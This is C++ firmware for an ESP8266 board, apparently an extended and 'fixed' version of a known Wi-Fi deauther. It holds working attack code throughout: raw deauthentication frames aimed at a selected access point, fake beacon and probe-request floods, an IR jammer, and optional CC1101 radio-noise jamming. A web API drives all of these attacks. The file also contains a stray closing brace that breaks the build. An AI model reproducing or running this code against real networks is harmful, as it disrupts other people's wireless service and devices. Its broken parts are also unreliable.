/*
 * ESP8266 Deauther Extended - FIXED
 * Based on SpaceHuhn/esp8266_deauther v2
 */

#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <LittleFS.h>
#include <EEPROM.h>

extern "C" {
  #include "user_interface.h"
}

// ===== ДИСПЛЕЙ =====
#include <SPI.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7735.h>

#define TFT_CS   15
#define TFT_DC    0
#define TFT_RST   2

Adafruit_ST7735 tft(TFT_CS, TFT_DC, TFT_RST);

// ===== IR JAMMER =====
#define IR_PIN   14

// ===== CC1101 (опціонально) =====
// #define CC1101_ENABLED
#ifdef CC1101_ENABLED
  #include <ELECHOUSE_CC1101_SRC_DRV.h>
  #define CC_CS    4
  #define CC_GDO0  5
#endif

// ===== НАЛАШТУВАННЯ =====
const char* ap_ssid = "Deauther";
const char* ap_password = "deauther";
const byte dns_port = 53;
const IPAddress apIP(192, 168, 4, 1);
const IPAddress netMsk(255, 255, 255, 0);

DNSServer dnsServer;
ESP8266WebServer server(80);

// ===== СТАНИ =====
bool deauthRunning = false;
bool beaconRunning = false;
bool probeRunning = false;
bool irRunning = false;
bool cc1101JamRunning = false;

uint32_t packetCounter = 0;
uint32_t lastDisplayUpdate = 0;

String selectedSSID = "";
uint8_t selectedBSSID[6];
uint8_t selectedChannel = 1;

String beaconSSIDs[20];
int beaconCount = 0;

// ===== ПРОТОТИПИ =====
void startWebServer();
void handleRoot();
void handleAPI();
bool handleFile(String path, String contentType);
void updateDisplay();
void drawStatusScreen(String status, String info1, String info2, String info3);
void startDeauth();
void stopDeauth();
void startBeacon();
void stopBeacon();
void startProbe();
void stopProbe();
void startIR();
void stopIR();
void sendDeauthPacket();
void sendBeaconPacket(String ssid);
void scanWiFi();
void stopAll();

// =============================================
// SETUP
// =============================================
void setup() {
  Serial.begin(115200);
  delay(500);
  
  // Дисплей
  SPI.begin();
  tft.initR(INITR_MINI160x80);
  tft.setRotation(1);
  tft.fillScreen(ST77XX_BLACK);
  tft.setTextWrap(false);
  
  drawStatusScreen("DEAUTHER", "Starting...", "", "");
  
  // LittleFS
  if (!LittleFS.begin()) {
    drawStatusScreen("ERROR", "LittleFS failed", "Check filesystem", "");
    delay(3000);
  }
  
  // EEPROM
  EEPROM.begin(512);
  
  // WiFi AP
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, netMsk);
  WiFi.softAP(ap_ssid, ap_password);
  
  // DNS Server
  dnsServer.start(dns_port, "*", apIP);
  
  // Web Server
  startWebServer();
  
  // IR
  pinMode(IR_PIN, OUTPUT);
  digitalWrite(IR_PIN, LOW);
  
  #ifdef CC1101_ENABLED
    ELECHOUSE_cc1101.setSpiPin(14, 12, 13, CC_CS);
    ELECHOUSE_cc1101.setGDO0(CC_GDO0);
    ELECHOUSE_cc1101.Init();
    ELECHOUSE_cc1101.setMHZ(433.92);
    ELECHOUSE_cc1101.setPA(12);
  #endif
  
  drawStatusScreen("DEAUTHER", ("SSID: " + String(ap_ssid)).c_str(), "IP: 192.168.4.1", "Connect to WiFi");
  delay(1500);
  updateDisplay();
}

// =============================================
// LOOP
// =============================================
void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  
  // Атаки
  if (deauthRunning && selectedSSID.length() > 0) {
    static unsigned long lastDeauth = 0;
    if (millis() - lastDeauth >= 10) {
      lastDeauth = millis();
      sendDeauthPacket();
      packetCounter++;
    }
  }
  
  if (beaconRunning) {
    static unsigned long lastBeacon = 0;
    if (millis() - lastBeacon >= 100) {
      lastBeacon = millis();
      for (int i = 0; i < beaconCount; i++) {
        sendBeaconPacket(beaconSSIDs[i]);
      }
      packetCounter += beaconCount;
    }
  }
  
  if (probeRunning) {
    static unsigned long lastProbe = 0;
    if (millis() - lastProbe >= 50) {
      lastProbe = millis();
      uint8_t mac[6];
      for (int i = 0; i < 6; i++) mac[i] = random(256);
      
      uint8_t pkt[64];
      int pos = 0;
      pkt[pos++] = 0x40;
      pkt[pos++] = 0x00;
      pkt[pos++] = 0x00; pkt[pos++] = 0x00;
      for (int i = 0; i < 6; i++) pkt[pos++] = 0xFF;
      memcpy(pkt + pos, mac, 6); pos += 6;
      for (int i = 0; i < 6; i++) pkt[pos++] = 0x00;
      
      wifi_send_pkt_freedom(pkt, pos, 0);
      packetCounter++;
    }
  }
  
  if (irRunning) {
    static unsigned long lastIR = 0;
    if (millis() - lastIR >= 1) {
      lastIR = millis();
      digitalWrite(IR_PIN, !digitalRead(IR_PIN));
    }
  }
  
  #ifdef CC1101_ENABLED
  if (cc1101JamRunning) {
    static unsigned long lastJam = 0;
    if (millis() - lastJam >= 10) {
      lastJam = millis();
      byte noise[61];
      for (int i = 0; i < 61; i++) noise[i] = random(256);
      ELECHOUSE_cc1101.SendData(noise, 61, 10);
    }
  }
  #endif
  
  // Оновлення дисплея
  if (millis() - lastDisplayUpdate >= 1000) {
    lastDisplayUpdate = millis();
    updateDisplay();
  }
}

// =============================================
// WEB SERVER (ВИПРАВЛЕНО)
// =============================================
void startWebServer() {
  server.on("/", handleRoot);
  server.on("/api", HTTP_GET, handleAPI);
  server.on("/api", HTTP_POST, handleAPI);
  server.serveStatic("/style.css", LittleFS, "/style.css");
  server.serveStatic("/script.js", LittleFS, "/script.js");
  server.onNotFound([]() {
    String path = server.uri();
    String contentType = "text/html";
    if (path.endsWith(".css")) contentType = "text/css";
    if (path.endsWith(".js")) contentType = "application/javascript";
    
    if (!handleFile(path, contentType)) {
      server.send(404, "text/plain", "File not found");
    }
  });
  server.begin();
}

void handleRoot() {
  // Перенаправлення на attack.html (як в оригінальному Deauther)
  server.sendHeader("Location", "/attack.html", true);
  server.send(302, "text/plain", "");
}
}

bool handleFile(String path, String contentType) {
  if (path.endsWith("/")) path += "index.html";
  
  if (LittleFS.exists(path)) {
    File file = LittleFS.open(path, "r");
    server.streamFile(file, contentType);
    file.close();
    return true;
  }
  return false;
}

void handleAPI() {
  String cmd = server.arg("cmd");
  String response = "{";
  
  if (cmd == "scan") {
    scanWiFi();
    response += "\"status\":\"scanning\"";
  }
  else if (cmd == "results") {
    int n = WiFi.scanComplete();
    response += "\"networks\":[";
    if (n > 0) {
      for (int i = 0; i < min(n, 30); i++) {
        if (i > 0) response += ",";
        String ssid = WiFi.SSID(i);
        ssid.replace("\\", "\\\\");
        ssid.replace("\"", "\\\"");
        response += "{\"ssid\":\"" + ssid + "\",";
        response += "\"rssi\":" + String(WiFi.RSSI(i)) + ",";
        response += "\"ch\":" + String(WiFi.channel(i)) + ",";
        response += "\"bssid\":\"" + WiFi.BSSIDstr(i) + "\"}";
      }
      WiFi.scanDelete();
    }
    response += "]";
  }
  else if (cmd == "deauth") {
    if (server.arg("start") == "true") {
      selectedSSID = server.arg("ssid");
      selectedChannel = server.arg("ch").toInt();
      String bssidStr = server.arg("bssid");
      int pos = 0;
      for (int i = 0; i < 6; i++) {
        selectedBSSID[i] = strtol(bssidStr.substring(pos, pos + 2).c_str(), NULL, 16);
        pos += 3;
      }
      startDeauth();
    } else {
      stopDeauth();
    }
    response += "\"deauth\":" + String(deauthRunning);
  }
  else if (cmd == "beacon") {
    if (server.arg("start") == "true") {
      String list = server.arg("list");
      int pos = 0;
      beaconCount = 0;
      while (pos < (int)list.length() && beaconCount < 20) {
        int comma = list.indexOf(',', pos);
        if (comma == -1) comma = list.length();
        beaconSSIDs[beaconCount++] = list.substring(pos, comma);
        pos = comma + 1;
      }
      startBeacon();
    } else {
      stopBeacon();
    }
    response += "\"beacon\":" + String(beaconRunning);
  }
  else if (cmd == "probe") {
    if (server.arg("start") == "true") startProbe();
    else stopProbe();
    response += "\"probe\":" + String(probeRunning);
  }
  else if (cmd == "ir") {
    if (server.arg("start") == "true") startIR();
    else stopIR();
    response += "\"ir\":" + String(irRunning);
  }
  else if (cmd == "status") {
    response += "\"deauth\":" + String(deauthRunning) + ",";
    response += "\"beacon\":" + String(beaconRunning) + ",";
    response += "\"probe\":" + String(probeRunning) + ",";
    response += "\"ir\":" + String(irRunning) + ",";
    response += "\"packets\":" + String(packetCounter) + ",";
    response += "\"clients\":" + String(WiFi.softAPgetStationNum()) + ",";
    response += "\"uptime\":" + String(millis() / 1000);
    
    if (deauthRunning) {
      response += ",\"target\":\"" + selectedSSID + "\"";
      response += ",\"channel\":" + String(selectedChannel);
    }
    if (beaconRunning) {
      response += ",\"beaconCount\":" + String(beaconCount);
    }
  }
  else if (cmd == "stopall") {
    stopAll();
    response += "\"status\":\"stopped\"";
  }
  #ifdef CC1101_ENABLED
  else if (cmd == "cc1101_jam") {
    if (server.arg("start") == "true") {
      float freq = server.arg("freq").toFloat();
      if (freq > 0) ELECHOUSE_cc1101.setMHZ(freq);
      cc1101JamRunning = true;
    } else {
      cc1101JamRunning = false;
      ELECHOUSE_cc1101.setSidle();
    }
    response += "\"cc1101_jam\":" + String(cc1101JamRunning);
  }
  else if (cmd == "cc1101_scan") {
    float freq = server.arg("freq").toFloat();
    if (freq > 0) ELECHOUSE_cc1101.setMHZ(freq);
    int rssi = ELECHOUSE_cc1101.getRssi();
    response += "\"freq\":" + String(freq) + ",\"rssi\":" + String(rssi);
  }
  #endif
  else {
    response += "\"error\":\"unknown command\"";
  }
  
  response += "}";
  server.send(200, "application/json", response);
}

// =============================================
// АТАКИ
// =============================================
void startDeauth() {
  stopAll();
  deauthRunning = true;
  packetCounter = 0;
  wifi_set_channel(selectedChannel);
}

void stopDeauth() {
  deauthRunning = false;
}

void startBeacon() {
  stopAll();
  beaconRunning = true;
  packetCounter = 0;
}

void stopBeacon() {
  beaconRunning = false;
}

void startProbe() {
  stopAll();
  probeRunning = true;
  packetCounter = 0;
}

void stopProbe() {
  probeRunning = false;
}

void startIR() {
  irRunning = true;
}

void stopIR() {
  irRunning = false;
  digitalWrite(IR_PIN, LOW);
}

void stopAll() {
  deauthRunning = false;
  beaconRunning = false;
  probeRunning = false;
  #ifdef CC1101_ENABLED
  cc1101JamRunning = false;
  ELECHOUSE_cc1101.setSidle();
  #endif
}

void sendDeauthPacket() {
  uint8_t pkt[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    selectedBSSID[0], selectedBSSID[1], selectedBSSID[2],
    selectedBSSID[3], selectedBSSID[4], selectedBSSID[5],
    selectedBSSID[0], selectedBSSID[1], selectedBSSID[2],
    selectedBSSID[3], selectedBSSID[4], selectedBSSID[5],
    0x00, 0x00, 0x01, 0x00
  };
  wifi_send_pkt_freedom(pkt, sizeof(pkt), 0);
}

void sendBeaconPacket(String ssid) {
  uint8_t mac[6];
  for (int i = 0; i < 6; i++) mac[i] = random(256);
  mac[0] = (mac[0] & 0xFE) | 0x02;
  
  wifi_set_channel(1);
  
  uint8_t pkt[128];
  memset(pkt, 0, sizeof(pkt));
  int pos = 0;
  
  pkt[pos++] = 0x80; pkt[pos++] = 0x00;
  pkt[pos++] = 0x00; pkt[pos++] = 0x00;
  for (int i = 0; i < 6; i++) pkt[pos++] = 0xFF;
  memcpy(&pkt[pos], mac, 6); pos += 6;
  memcpy(&pkt[pos], mac, 6); pos += 6;
  pkt[pos++] = random(256); pkt[pos++] = random(256);
  for (int i = 0; i < 8; i++) pkt[pos++] = random(256);
  pkt[pos++] = 0x64; pkt[pos++] = 0x00;
  pkt[pos++] = 0x21; pkt[pos++] = 0x04;
  
  int len = ssid.length();
  pkt[pos++] = 0x00; pkt[pos++] = len;
  memcpy(&pkt[pos], ssid.c_str(), len); pos += len;
  
  pkt[pos++] = 0x01; pkt[pos++] = 0x08;
  pkt[pos++] = 0x82; pkt[pos++] = 0x84;
  pkt[pos++] = 0x8B; pkt[pos++] = 0x96;
  pkt[pos++] = 0x24; pkt[pos++] = 0x30;
  pkt[pos++] = 0x48; pkt[pos++] = 0x6C;
  pkt[pos++] = 0x03; pkt[pos++] = 0x01; pkt[pos++] = 0x01;
  
  wifi_send_pkt_freedom(pkt, pos, 0);
}

void scanWiFi() {
  WiFi.mode(WIFI_AP_STA);
  WiFi.disconnect();
  WiFi.scanNetworks(true, true);
}

// =============================================
// ДИСПЛЕЙ
// =============================================
void drawStatusScreen(String status, String info1, String info2, String info3) {
  tft.fillScreen(ST77XX_BLACK);
  
  tft.fillRect(0, 0, 160, 16, ST77XX_CYAN);
  tft.setTextColor(ST77XX_BLACK);
  tft.setTextSize(1);
  tft.setCursor(5, 4);
  tft.print(status);
  
  tft.setTextColor(ST77XX_WHITE);
  tft.setCursor(5, 25);
  tft.print(info1);
  tft.setCursor(5, 40);
  tft.print(info2);
  tft.setCursor(5, 55);
  tft.print(info3);
  
  tft.fillRect(0, 144, 160, 16, 0x1082);
  tft.setTextColor(0x8410);
  tft.setCursor(2, 148);
  tft.print("192.168.4.1");
}

void updateDisplay() {
  String status;
  String info1, info2, info3;
  
  if (deauthRunning) {
    status = "DEAUTH ACTIVE";
    info1 = "Target: " + selectedSSID.substring(0, 18);
    info2 = "Packets: " + String(packetCounter);
    info3 = "Channel: " + String(selectedChannel);
  } else if (beaconRunning) {
    status = "BEACON ACTIVE";
    info1 = "SSIDs: " + String(beaconCount);
    info2 = "Packets: " + String(packetCounter);
    info3 = "Running...";
  } else if (probeRunning) {
    status = "PROBE ACTIVE";
    info1 = "Probe Requests";
    info2 = "Packets: " + String(packetCounter);
    info3 = "Running...";
  } else if (irRunning) {
    status = "IR JAMMER";
    info1 = "IR LED Active";
    info2 = "38kHz Carrier";
    info3 = "Jamming...";
  } else {
    status = "DEAUTHER READY";
    info1 = "WiFi: Deauther";
    info2 = "IP: 192.168.4.1";
    info3 = "Clients: " + String(WiFi.softAPgetStationNum());
  }
  
  drawStatusScreen(status, info1, info2, info3);
}